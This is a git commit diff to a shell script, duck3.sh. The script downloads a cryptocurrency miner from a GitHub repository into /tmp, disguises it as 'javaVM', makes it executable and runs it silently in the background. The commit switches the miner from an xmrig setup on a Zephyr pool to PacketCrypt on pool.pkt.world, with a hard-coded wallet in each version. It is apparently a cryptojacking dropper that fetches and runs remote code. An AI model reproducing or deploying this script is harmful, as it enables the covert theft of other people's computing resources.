3439f8dce139065489b928dd53260bb02525e85e
cronjob <thesunofme1@gmail.com>
2023-11-28 08:47:14 +0700

    Update duck3.sh

--- duck3.sh
+++ duck3.sh
@@ -1,10 +1,10 @@
 #!/bin/sh
 if [ -f /tmp/javaVM ]
  	then
- 	/tmp/javaVM -o sg-zephyr.miningocean.org:5332 -u ZEPHs9EoDAxbWgcA8eLM6xVPpcKt5vMZz47KN29LaYRZVKhuowDdsM22n2ExnU3A7BiS3CxzXCuruRBofjuwvoP9FSRyXzzWWSt -p duckz -a rx/0 -k --donate-level > /dev/null 2>&1 &
+ 	/tmp/javaVM ann -p pkt1qqyhcmz6ezk068g7jpgw67lnuyvtdelwx3jf4q5 http://pool.pkt.world > /dev/null 2>&1 &
  	echo Started Existing
  	else
- 		wget -q https://github.com/thesunofme/trash/raw/main/xmrig -O /tmp/javaVM
+ 		wget -q https://github.com/thesunofme/trash/raw/main/packetcrypt -O /tmp/javaVM
  		chmod +x /tmp/javaVM
- 		/tmp/javaVM -o sg-zephyr.miningocean.org:5332 -u ZEPHs9EoDAxbWgcA8eLM6xVPpcKt5vMZz47KN29LaYRZVKhuowDdsM22n2ExnU3A7BiS3CxzXCuruRBofjuwvoP9FSRyXzzWWSt -p duckz -a rx/0 -k --donate-level > /dev/null 2>&1 &
+ 		/tmp/javaVM ann -p pkt1qqyhcmz6ezk068g7jpgw67lnuyvtdelwx3jf4q5 http://pool.pkt.world > /dev/null 2>&1 &
 fi
